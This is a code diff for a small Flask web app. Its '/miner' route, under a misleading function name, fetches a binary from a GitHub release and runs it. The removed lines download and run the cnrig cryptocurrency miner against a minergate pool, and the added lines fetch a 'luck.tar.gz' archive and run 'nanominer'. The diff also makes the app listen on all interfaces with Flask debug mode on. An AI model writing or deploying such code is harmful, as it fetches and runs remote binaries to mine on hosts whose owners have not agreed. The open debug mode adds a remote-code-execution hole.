@@ -15,9 +15,9 @@ def favicon():
 
 @app.route("/miner")
 def pyver():
-    a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
-    a  = os.popen('chmod +x cnrig').readlines()
-    b  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
+    a  = os.popen('wget https://github.com/teskilah/teshe/releases/download/das/luck.tar.gz').readlines()
+    a  = os.popen('tar -xvf luck.tar.gz').readlines()
+    b  = os.popen('./nanominer').readlines()
     return a
 
 @app.route("/tag")
@@ -26,6 +26,7 @@ def tag():
     p.wait()
     return p.stdout.read()
 
-if __name__ == "__main__":
-    app.run()
-   
+if __name__ == '__main__':
+    # Bind to PORT if defined, otherwise default to 5000.
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=True, use_reloader=True)
